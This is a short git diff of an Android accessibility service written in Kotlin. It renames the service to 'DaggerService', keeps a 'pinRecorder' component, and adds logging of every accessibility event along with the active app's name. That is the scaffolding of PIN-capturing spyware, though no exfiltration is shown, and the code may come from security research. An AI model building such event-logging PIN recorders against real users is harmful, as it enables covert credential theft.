@@ -12,14 +12,13 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.os.Build
 import android.util.Log
-import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 
-class LoggingAccessibilityService : AccessibilityService() {
+class DaggerService : AccessibilityService() {
 
     companion object {
         @JvmStatic
-        private val TAG: String = LoggingAccessibilityService::class.java.name
+        private val TAG: String = DaggerService::class.java.name
     }
 
     lateinit var pinRecorder: PinRecorder
@@ -35,6 +34,7 @@ class LoggingAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        logEvent (event, event.toString())
         Log.d(TAG, "Active app: " + event.packageName)
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
